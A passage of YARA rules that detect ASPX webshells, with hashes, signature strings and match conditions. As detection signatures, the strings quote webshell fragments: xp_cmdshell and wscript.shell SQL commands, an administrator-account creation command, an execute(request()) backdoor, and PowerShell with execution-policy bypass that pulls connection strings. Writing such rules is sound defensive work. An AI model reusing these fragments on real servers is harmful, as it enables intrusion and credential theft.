        $s4 = "<asp:LinkButton ID=\"zcg_lbtnADSCurrentDomain\" runat=\"server\" Text=\"CurrentDomain\" CommandArgument=\"WinNT://\"" fullword ascii
        $s5 = "<asp:LinkButton ID=\"zcg_lbtnADSWorkGroup\" runat=\"server\" Text=\"WorkGroup\" CommandArgument=\"WinNT://WORKGROUP\"" fullword ascii
        $s6 = "<asp:LinkButton ID=\"zcg_lbtnADSLocalMachine\" runat=\"server\" Text=\"LocalMachine\" CommandArgument=\"WinNT://\"" fullword ascii
        $s7 = "ndedproc('xp_cmdshell','xplog70.dll')\">Add xp_cmdshell</asp:ListItem><asp:ListItem Value=\"Use master dbcc addextendedproc('sp_" ascii
        $s8 = "o [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\\1." ascii
        $s9 = "SQLExec : <asp:DropDownList runat=\"server\" ID=\"Bin_List_Exec\" AutoPostBack=\"True\" OnSelectedIndexChanged=\"Bin_List_Select" ascii
        $s10 = "<td ><span style=\"float:right;\"><a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WebShell Ver: <%=Version%></a></span><" ascii
        $s11 = "{2} \\r\\n string:\\r\\n {3}</xmp></pre>\",ex.GetType(),ex.Message,ex.StackTrace,ex));}" fullword ascii
        $s12 = "dirtree 'c:\\',1,1\">XP_dirtree</asp:ListItem><asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec " ascii
        $s13 = "<asp:LinkButton ID=\"zcg_lbtnADSWinNT\" runat=\"server\" Text=\"WinNT\" CommandArgument=\"WinNT:\" OnClick=\"zcg_lbtnADS_Click\"" ascii
        $s14 = "<asp:LinkButton ID=\"zcg_lbtnADSIIS\" runat=\"server\" Text=\"IIS\" CommandArgument=\"IIS:\" OnClick=\"zcg_lbtnADS_Click\"></asp" ascii
        $s15 = "ou sure delete the files ?')){Bin_PostBack('Bin_DelFile',d_file)};}\\\">Delete selected</a>\";" fullword ascii
        $s16 = "<asp:LinkButton ID=\"zcg_lbtnADSLDAP\" runat=\"server\" Text=\"LDAP\" CommandArgument=\"LDAP:\" OnClick=\"zcg_lbtnADS_Click\"></" ascii
        $s17 = "\"#\\\" onclick=\\\"Bin_PostBack('Bin_CloneTime','\"+Bin_Files.Name+\"')\\\">Time</a> \";" fullword ascii
        $s18 = "public const string Password=\"21232f297a57a5a743894a0e4a801fc3\";" fullword ascii
        $s19 = "asp:ListItem Value=\"Exec master.dbo.xp_cmdshell 'net user'\">XP_cmdshell exec</asp:ListItem><asp:ListItem Value=\"EXEC MASTER.." ascii
        $s20 = "nsert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _019eb61a6b5046502808fb5ab2925be65c0539b4_0378b9a95ed3af4943c6a58d87345dc944b881f7_0f8a4b1a9436476f570d004240efb2c9bbc19aa6__11
{
    meta:
        description = "aspx - from files 019eb61a6b5046502808fb5ab2925be65c0539b4.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "0ea1ec937dd7ada5c804f3448eb6d725ded32da469fc4847e23ba2e738411bf4"
        hash2 = "a4ea5fc7d14f27bbf0697782e4a948cd50442164b1d84e7b23e6463da853a653"
        hash3 = "89cbea413c850aab5d67c4fa4798cdb9b62f56083e2f9362292a5e48423fee85"
        hash4 = "8d471c18d5306c15331e366d9595b6258fb51ea28ba13c288edb06c6a9c5a7f1"
        hash5 = "5c87ec9fbe71e3bdac867de4462c41cd28f1e50b31b1cd7e4fc6371a12f90db4"
        hash6 = "e177b10b6508f4f80cdfc5db5efee2594f29661889869b7759fd7de6b3b809ac"
        hash7 = "6f05055413ed95f501da9b6282cfc012d6201853b620a59d250edeac66474c16"
        hash8 = "15eed42e4904205b2ef2ff285ff1ce6c8138296c12cf075a2562c69a5fafd1cb"
        hash9 = "c3a539c800defe4c8e7147a3d36f436cd3c49c455c45de0431cc9ab65a2fe493"
        hash10 = "9c9e6feece7f19a1c7151a5778c3b20df83170a63402199b15eddd8a57c85297"
        hash11 = "2b7cce5da1fa31a0a688aa3c34b4c2ba33768596354ddeca3f9edaf5e4634da7"
        hash12 = "b96628b36911fce4ffa18cc10ba36d1dbd260f638c18b60e73f484c09ef0be09"
        hash13 = "0b98620cb8ac21af5712f4e88ed6f42791eb35f48d2ed56b86b32ced845c68d1"
        hash14 = "a7da83250466100782ccb95ef8e2b4c5832df8811e99b8e332594a869391dfa6"
        hash15 = "d8f79f3f185fe10f8598b5d88fd55219d809856150fd693347b32d7df6ad6999"
        hash16 = "1286a0815c6982fadf3a1da2565fedfd133b8d07a5de1d592a640c3abbc2ffa5"
        hash17 = "a350ca8e276a0d6f788ecea1b826e089a63df84b53ba92c9f13e701c70d6781e"
        hash18 = "2152f5aae39aebabd342ec252b2ec0fec2913b605b21c3983c016a3b83949b7f"
        hash19 = "c5d0c5851f404a27a261f098d69a86807b93e255879d736ba0fb2c96250661e6"
        hash20 = "46942a63d4d7113cca44fd86155915de0edaa1732177f878987e5893801e2daf"
        hash21 = "ebb106f401b34fe0656403d3d8c6cd836d1ac9680c60fdd8b60380c6a3bc0602"
        hash22 = "6e5b606bb919b0c9cdf98383aaa5e4d606db87e254251dc3ca7498b918900969"
    strings:
        $s1 = "if(Request[\"__EVENTTARGET\"]==\"Bin_Editfile\" || Request[\"__EVENTTARGET\"]==\"Bin_Createfile\")" fullword ascii
        $s2 = "File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.System);" fullword ascii
        $s3 = "s+=@\"function Bin_PostBack(eventTarget,eventArgument)\";" fullword ascii
        $s4 = "Process[] p=Process.GetProcesses();" fullword ascii
        $s5 = "TR.Attributes[\"title\"]=\"Site:\"+child.Properties[\"ServerComment\"].Value.ToString();" fullword ascii
        $s6 = "page.RegisterHiddenField(\"__EVENTTARGET\",\"\");" fullword ascii
        $s7 = "Bin_Span_FrameVersion.InnerHtml=\"Framework Ver : \"+Environment.Version.ToString();" fullword ascii
        $s8 = "File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Archive);" fullword ascii
        $s9 = "File.SetAttributes(path,File.GetAttributes(path)| FileAttributes.Hidden);" fullword ascii
        $s10 = "td.Text=dt.Rows[j][\"ProcessID\"].ToString();" fullword ascii
        $s11 = "ltcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);" fullword ascii
        $s12 = "rtcpClient=new Socket(AddressFamily.InterNetwork,SocketType.Stream,ProtocolType.Tcp);" fullword ascii
        $s13 = "s+=@\"theform.__EVENTTARGET.value=eventTarget;\";" fullword ascii
        $s14 = "oEnum=(m.Properties.GetEnumerator()as PropertyDataCollection.PropertyDataEnumerator);" fullword ascii
        $s15 = "td.Text=sp.ProcessName.ToString();" fullword ascii
        $s16 = "foreach(Process sp in p)" fullword ascii
        $s17 = "foreach(string innerSubKey in sk.GetSubKeyNames())" fullword ascii
        $s18 = "StreamReader sr=new StreamReader(Bin_Files.FullName,Encoding.Default);" fullword ascii
        $s19 = "return string.Format(\"{0:########0.00} G\",((Double)fileSize)/(1024 * 1024 * 1024));" fullword ascii
        $s20 = "foreach(FileInfo Bin_Files in dir.GetFiles())" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef or uint16(0) == 0x3c76 ) and filesize < 400KB and ( 8 of them ) ) or ( all of them )
}

rule _41fbd2f965a3c48011f9a2b6c629278c48286ab3_c97acc37c7715f9c667f420e4b0a37a7bf6d50a2_12
{
    meta:
        description = "aspx - from files 41fbd2f965a3c48011f9a2b6c629278c48286ab3.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c6da86380a656233b12552ce321026d4d481fc531cc8b44dee7a6b395cecfd9b"
        hash2 = "e0761cc8a8ab19665f13275ee1ae52e113438738fe376915a471b23388b7dc0b"
    strings:
        $x1 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\"  Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $s2 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Documents\\'>Documents</a>&nbsp&nbsp</td>" fullword ascii
        $s3 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'>All Users</a>&nbsp&nbsp</td>" fullword ascii
        $s4 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\"  Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s5 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\'>PcAn" fullword ascii
        $s6 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'>Config</a>&nbsp&nbsp</td>" fullword ascii
        $s7 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s8 = "mycon.ConnectionString = \"Persist Security Info = False;User id =\" + TextBoxSqlB.Text + \";pwd=\" + TextBoxSql" fullword ascii
        $s9 = "mycon.ConnectionString = \"Persist Security Info = False;User id =\" + TextBoxSqlB.Text + \";pwd=\" + TextBo" fullword ascii
        $s10 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'>Data</a>&nbsp&nbsp</td>" fullword ascii
        $s11 = "<asp:TextBox ID=\"TextBoxSqlCon\" runat=\"server\" Width=\"400px\" >net user char char /add &amp; net localgroup administrator" fullword ascii
        $s12 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'>Serv-u" fullword ascii
        $s13 = "<%@ Page Language=\"C#\" ContentType=\"text/html\"  validateRequest=\"false\" aspcompat=\"true\"%>" fullword ascii
        $s14 = "<td><a href='?page=index&src=C:\\windows\\Temp\\'>Temp</a>&nbsp&nbsp&nbsp</td>" fullword ascii
        $s15 = "<td><asp:TextBox ID=\"pass\" runat=\"server\" TextMode=\"Password\"></asp:TextBox></td>" fullword ascii
        $s16 = "//-------------------0x0F's Email Wantusirui#Foxmail.com---------------------" fullword ascii
        $s17 = "//-------------------Char's Email:Hackexp#126.com----------------------------%>" fullword ascii
        $s18 = "<td><a href='?page=index&src=C:\\Program Files\\Microsoft SQL Server\\'>Sql Server</a>&nbsp&nbsp</td>" fullword ascii
        $s19 = "/*Coded In Visual C# 2005 By:Char For Security*/</p>" fullword ascii
        $s20 = "<asp:Label ID=\"LbDns\" runat=\"server\" Text=\"DNS:\"></asp:Label>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _4a6874e956c14a95b402a9d8f26dad4f574d2efd_7c1d56b90e387d816ae61e11a37ee93359113c9d_13
{
    meta:
        description = "aspx - from files 4a6874e956c14a95b402a9d8f26dad4f574d2efd.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e821cef034dcfc77e87551596d8417b643742e1fac6c913a1bed98e53139327b"
        hash2 = "b0a31a7937be01fb4fe8705344b32bc0a7b3733639c615a3b400d3fc1bd1d7e3"
    strings:
        $s1 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.DateTime).Value = ((Text" fullword ascii
        $s2 = "<asp:Button id=\"btnExecute\" onclick=\"btnExecute_Click\" runat=\"server\" Text=\"Execute Query\"></asp:Button>" fullword ascii
        $s3 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Real).Value = ((TextBox)" fullword ascii
        $s4 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.SmallInt).Value = ((Text" fullword ascii
        $s5 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Decimal).Value = decimal" fullword ascii
        $s6 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Int).Value = ((TextBox)d" fullword ascii
        $s7 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Bit).Value = ((TextBox)d" fullword ascii
        $s8 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.BigInt).Value = ((TextBo" fullword ascii
        $s9 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.TinyInt).Value = uint.Pa" fullword ascii
        $s10 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NChar).Value = ((TextBox" fullword ascii
        $s11 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Float).Value = float.Par" fullword ascii
        $s12 = "sqlCommand.Parameters.Add(\"@procedure_name\", SqlDbType.NVarChar, 390).Value = cboSps.SelectedItem.Value;" fullword ascii
        $s13 = "<asp:Button id=\"btnExecute\" onclick=\"btnExecute_Click\" runat=\"server\" Text=\"Execute Query\"></asp:But" fullword ascii
        $s14 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NVarChar, int.Parse(((Ta" fullword ascii
        $s15 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.VarChar, int.Parse(((Tab" fullword ascii
        $s16 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.Char, int.Parse(((TableC" fullword ascii
        $s17 = "sqlCommand.Parameters.Add(((TableCell)dataGridItem.Controls[0]).Text, SqlDbType.NText, int.Parse(((Table" fullword ascii
        $s18 = "sqlCommand.Parameters[((TableCell)dataGridItem.Controls[0]).Text].Direction = ParameterDirection.InputOutput;" fullword ascii
        $s19 = "sqlCommand.CommandType = CommandType.StoredProcedure;" fullword ascii
        $s20 = "<asp:Button id=\"btnGetParams\" onclick=\"btnGetParameters_Click\" runat=\"server\" Text=\"Get Parameters\"></asp:Button>" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 8 of them ) ) or ( all of them )
}

rule _3193ee6ccf2cf6c34a35e4c68dd62501e4ff1479_4744ac68e002d301948fcd384853adc60a9a5a1c_b9b13c2dedaee8af2364ba1dd11c0fb0b27b4c36_14
{
    meta:
        description = "aspx - from files 3193ee6ccf2cf6c34a35e4c68dd62501e4ff1479.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "611bba6b24c3b5f8c2fd0b9a2bd4b803732bca204757520c33545ed79972f29f"
        hash2 = "55fee364ee3f49bfffd6384dd4939724e1cb92e69966956f967574aa70ecc269"
        hash3 = "dec56fb972444d9ad17cd70f52c944fd45729703ca2356f57e07822230bd3ce2"
    strings:
        $x1 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"{ $tempdir = (Get-Date).Ticks; new-item $env:temp\\$tempdir -Ite" fullword ascii
        $x2 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Fil" fullword ascii
        $x3 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($file in (get-childitem $path -Filter web.config -Recu" fullword ascii
        $x4 = "<asp:TextBox id=\"xpath\" width=\"350\" runat=\"server\">c:\\windows\\system32\\cmd.exe</asp:TextBox><br><br>" fullword ascii
        $x5 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd);\"" fullword ascii
        $x6 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-conten" fullword ascii
        $x7 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"remove-item $env:temp\\$tempdir -recurse;} \"" fullword ascii
        $x8 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.cip" fullword ascii
        $x9 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$aspnet_regiis = (get-childitem $env:windir\\microsoft.net\\ -Filt" ascii
        $x10 = "myProcessStartInfo.Arguments=\" /c powershell -C \"\"$ErrorActionPreference = 'SilentlyContinue';\" " fullword ascii
        $x11 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.con" fullword ascii
        $x12 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $" ascii
        $x13 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$ds=New-Object system.Data.DataSet;\"" fullword ascii
        $x14 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Try { $connstrings = $xml.get_DocumentElement(); } Catch { cont" fullword ascii
        $x15 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"{ $tempdir = (Get-Date).Ticks; new-item $env:temp\\$tempdir -ItemT" ascii
        $x16 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$cmd = new-object System.Data.SqlClient.SqlCommand(\"\"\"\"\"\"\"+" ascii
        $x17 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"$cmd = new-object System.Data.SqlClient.SqlCommand(\"\"\"\"\"\"\"+" ascii
        $x18 = "myProcessStartInfo.Arguments=\" /c powershell -C \"\"$conn=new-object System.Data.SqlClient.SQLConnection(\"\"\"\"\"\"\" + conn." ascii
        $x19 = "myProcessStartInfo.Arguments=\" /c powershell -C \"\"$conn=new-object System.Data.SqlClient.SQLConnection(\"\"\"\"\"\"\" + conn." ascii
        $s20 = "myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + \"Foreach ($file in (get-childitem $path -Filter web.config -Recurse" ascii
    condition:
        ( ( uint16(0) == 0x213c or uint16(0) == 0x253c ) and filesize < 70KB and ( 1 of ($x*) ) ) or ( all of them )
}

rule _898ebfa1757dcbbecb2afcdab1560d72ae6940de_a9fb7e58fc2008830c8a785bf532288895dc79b7_15
{
    meta:
        description = "aspx - from files 898ebfa1757dcbbecb2afcdab1560d72ae6940de.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ba08d9125617307e4f8235f02cf1d5928374eea275456914e51d8a367657d10c"
        hash2 = "b51eca570abad9341a08ae4d153d2c64827db876ee0491eb941d7e9a48d43554"
    strings:
        $x1 = "<p> Execute command with ASP.NET account using WSH(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $x2 = "<p> Execute command with ASP.NET account using W32(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $x3 = "<p> Execute command with ASP.NET account(<span class=\"style3\">Notice: only click &quot;Run&quot; to run</span>)</p>" fullword ascii
        $s4 = "&nbsp;&nbsp; &nbsp; --- &nbsp;End Ip : &nbsp;<asp:TextBox ID=\"txtEndIP\" runat=\"server\" Width=\"185px\">127.0.0.1</asp:Text" fullword ascii
        $s5 = "<td><a href=\"?action=user\" >List User Accounts</a> - <a href=\"?action=auser\" >IIS Anonymous User</a>- <a href=\"?action=scan" ascii
        $s6 = "dim HostName As string = \"<font color=white>HostName :</font> <b>\" + Environment.MachineName + \"</b> - <font color=white>Use" fullword ascii
        $s7 = "<p>[ ASP.NET Port Scanner ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href=\"javascript:history.back(1);\">Back</a>" fullword ascii
        $s8 = ">Port Scanner</a> - <a href=\"?action=iisspy\" >IIS Spy</a> - <a href=\"?action=applog\" >Application Event Log </a> - <a href=" ascii
        $s9 = "/b><br><font color=white>System Dir :</font> <b>\" + Environment.SystemDirectory + \"</b>\"" fullword ascii
        $s10 = "Start IP :&nbsp;&nbsp;<asp:TextBox ID=\"txtStartIP\" runat=\"server\" Width=\"177px\">127.0.0.1</asp:TextBox>" fullword ascii
        $s11 = "Ports &nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;<asp:TextBox ID=\"txtPorts\" runat=\"server\" Width=\"473px\">21,25,80,1433,3306,3389</as" fullword ascii
        $s12 = "C# coded by Hackwol & Lenk, VB coded by kikicoco (19/08/2008)<br /><br />" fullword ascii
        $s13 = "dim OSVersion As string = \"<font color=white>OS Version :</font> <b>\" + Environment.OSVersion.ToString() + \"</b>\"" fullword ascii
        $s14 = "<asp:TextBox ID=\"txtRegValue\" runat=\"server\" style=\"border: 1px solid #084B8E\">ComputerName</asp:TextBox>&nbsp;&nbsp;" fullword ascii
        $s15 = "Dim bytesToHash() As Byte = System.Text.Encoding.ASCII.GetBytes(strToHash)" fullword ascii
        $s16 = "HARDWARE_INFO += \"<font color=white>Hardware Info :</font> <b>\" + de.Value + \"CPU - \"" fullword ascii
        $s17 = "<p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"javascript:history.back(1);\">Back</a></i> </p>" fullword ascii
        $s18 = "<p>[ MSSQL Query ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href=\"javascript:history.back(1);\">Back</a></i></p>" fullword ascii
        $s19 = "dim IISversion As string = \"<font color=white> - IIS Version :</font> <b>\" + Request.ServerVariables(\"SERVER_SOFTWARE\") + \"" ascii
        $s20 = "&nbsp;&nbsp; &nbsp; --- &nbsp;End Ip : &nbsp;<asp:TextBox ID=\"txtEndIP\" runat=\"server\" Width=\"185px\">127.0.0.1</asp:TextBo" ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _025347b68b4bf19dca2bad266132a5971f4c201a_9fcd8c3093e933b34c4faae4f1f58b4738eba252_16
{
    meta:
        description = "aspx - from files 025347b68b4bf19dca2bad266132a5971f4c201a.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "48ab098fdf2df49cb79880d67daea425ce49166fb29535ff6c0ad3751fe77877"
        hash2 = "4f6fa6a45017397c7e1c9cd5a17235ccb1ff0f5087dfa6b7384552bf507e7fe1"
    strings:
        $x1 = "output.Text = @\"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in mind" fullword ascii
        $x2 = "//http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html" fullword ascii
        $x3 = "output.Text = @\"Use this shell as a normal powershell console. Each command is executed in a new process, keep this in m" fullword ascii
        $x4 = "1. Paste the script in command textbox and click 'Encode and Execute'. A reasonably large script could be executed using this." fullword ascii
        $x5 = "Executing PowerShell scripts on the target - " fullword ascii
        $x6 = "2. Use powershell one-liner (example below) for download & execute in the command box." fullword ascii
        $s7 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" fullword ascii
        $s8 = "Response.AppendHeader(\"Content-Disposition\", \"attachment; filename=\" + console.Text);" fullword ascii
        $s9 = "<asp:Button ID=\"encode\" runat=\"server\" Text=\"Encode and Execute\" OnClick=\"base64encode\" />" fullword ascii
        $s10 = "while using commands (like changing current directory or running session aware scripts). " fullword ascii
        $s11 = "output.Text = \"Upload status: The file could not be uploaded. The following error occured: \" + ex.Message;" fullword ascii
        $s12 = "string command = \"Invoke-Expression $(New-Object IO.StreamReader (\" +" fullword ascii
        $s13 = "To download a file enter the actual path on the server in command textbox." fullword ascii
        $s14 = "To upload a file you must mention the actual path on server (with write permissions) in command textbox. " fullword ascii
        $s15 = "//This section based on cmdasp webshell by http://michaeldaw.org" fullword ascii
        $s16 = "<asp:Button ID=\"downloadbutton\" runat=\"server\" Text=\"Download\" OnClick=\"downloadbutton_Click\" />" fullword ascii
        $s17 = "3. By uploading the script to the target and executing it." fullword ascii
        $s18 = "(OS temporary directory like C:\\Windows\\Temp may be writable.)" fullword ascii
        $s19 = "http://www.labofapenetrationtester.com/2014/06/introducing-antak.html" fullword ascii
        $s20 = "void execcommand(string cmd)" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 20KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0e8b291e8acfae0f23ad5cbd6f08546a14ba6086_a34ca74451e192d9ec53ba2e4ac04a01ee73aba6_aefc46c3394c2b2b1d11d9c3fe25b09afda491c5__17
{
    meta:
        description = "aspx - from files 0e8b291e8acfae0f23ad5cbd6f08546a14ba6086.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "46a73ee18a69b984a6f9a67727fcf6533460f01e7f096bde3a98ff97ae119182"
        hash2 = "d175b3176f1fb891735a2aaed2bc851074b3b50d4eb99c90146dc6a0eaa26d48"
        hash3 = "a6ac9698bd3a8081d9ace0088e1e96502c9da5f18650af8c882dda6e18ae4b31"
        hash4 = "bbee3a7eeceef058919740e7317cd8f552b194badf3cdc6922e42b115fdd7fa9"
        hash5 = "80c56db3cc4d03dcc1e0d512d5b212ded84110a3a98381efe625689a6675ca1d"
    strings:
        $x1 = ":<asp:TextBox ID=\"TextBoxDurl\" runat=\"server\" Width=\"270px\">http://www.baidu.com/img/logo.gif</asp:TextBox></br>" fullword ascii
        $x2 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\'><font color=\"#009900\">All Users</font></a> </td>" fullword ascii
        $s3 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\config\\'><font color=\"#009900\">Config</font></a> </td>" fullword ascii
        $s4 = "<asp:TextBox ID=\"TextBoxNewfile\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" >c:\\char.txt</asp:TextBox>" fullword ascii
        $s5 = ":<asp:TextBox ID=\"TextBoxDfile\" runat=\"server\" Width=\"270px\">c:\\logo.gif</asp:TextBox>" fullword ascii
        $s6 = "<td><a href='?page=index&src=C:\\WINDOWS\\system32\\inetsrv\\data\\'><font color=\"#009900\">Data</font></a> </td>" fullword ascii
        $s7 = "<td><a href='?page=index&src=C:\\Program Files\\RhinoSoft.com\\'><font color=\"#009900\">Serv-u" fullword ascii
        $s8 = "<td><a href='?page=index&src=C:\\windows\\Temp\\'><font color=\"#009900\">Temp</font></a> </td>" fullword ascii
        $s9 = "<td><asp:TextBox ID=\"pass\" runat=\"server\" TextMode=\"Password\" ForeColor = \"#009900\"></asp:TextBox></td>" fullword ascii
        $s10 = "<td><a href='?page=index&src=C:\\Program Files\\Microsoft SQL Server\\'><font color=\"#009900\">Sql Server</font></a> </td>" fullword ascii
        $s11 = "<asp:Label ID=\"LbDns\" runat=\"server\" Text=\"DNS:\" ForeColor=\"Red\"></asp:Label>" fullword ascii
        $s12 = "<td><a href='?page=index&src=C:\\Program Files\\'><font color=\"#009900\">Program Files</font></a> </td>" fullword ascii
        $s13 = "<td><a href='?page=index&src=C:\\Program Files\\Real\\'><font color=\"#009900\">Real</font></a> </td>" fullword ascii
        $s14 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Documents\\'><font color=\"#009900\">Documents</font></a> </" ascii
        $s15 = "<td><a href='?page=process'><font color=\"#009900\">" fullword ascii
        $s16 = "<td><a href='?page=index&src=C:\\Program Files\\serv-u\\'><font color=\"#009900\">Serv-u" fullword ascii
        $s17 = "<asp:TextBox ID=\"TextBoxReadDir\" runat=\"server\" Width=\"477px\" ForeColor=\"#009900\" ></asp:TextBox>" fullword ascii
        $s18 = "):</font><asp:TextBox ID=\"TextBoxExe\" runat=\"server\" Width=\"200px\"></asp:TextBox><br>" fullword ascii
        $s19 = ":<asp:TextBox ID=\"TextBoxCopyTo\" runat=\"server\" Width=\"468px\"></asp:TextBox> " fullword ascii
        $s20 = "<td><a href='?page=index&src=C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\'><font color=\"#009" ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x6967 ) and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _4b365fc9ddc8b247a12f4648cd5c91ee65e33fae_fe8298914b2a919864818a0586522553575b87d3_18
{
    meta:
        description = "aspx - from files 4b365fc9ddc8b247a12f4648cd5c91ee65e33fae.aspx"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "34bad999ee5dcdafa4cfa7c8d8c94fe837e70810686b338aea848e6772fd0656"
        hash2 = "af1c00696243f8b062a53dad9fb8b773fa1f0395631ffe6c7decc42c47eedee7"
    strings:
        $s1 = "<asp:Button runat=\"server\" ID=\"cmdExec\" Text=\"Execute\" />" fullword ascii
        $s2 = "string fstr = string.Format(\"<a href='?get={0}' target='_blank'>{1}</a>\"," fullword ascii
        $s3 = "HttpUtility.UrlEncode(dir + \"/\" + curfile.Name)," fullword ascii
        $s4 = "HttpUtility.UrlEncode(dir + \"/\" + curfile.Name));" fullword ascii
        $s5 = "HttpUtility.UrlEncode(dir + \"/\" + curdir.Name)," fullword ascii
        $s6 = "<asp:Button runat=\"server\" ID=\"cmdUpload\" Text=\"Upload\" />" fullword ascii
        $s7 = "if ((Request.QueryString[\"get\"] != null) && (Request.QueryString[\"get\"].Length > 0))" fullword ascii
        $s8 = "HttpUtility.HtmlEncode(driveRoot));" fullword ascii
        $s9 = "HttpUtility.UrlEncode(driveRoot)," fullword ascii
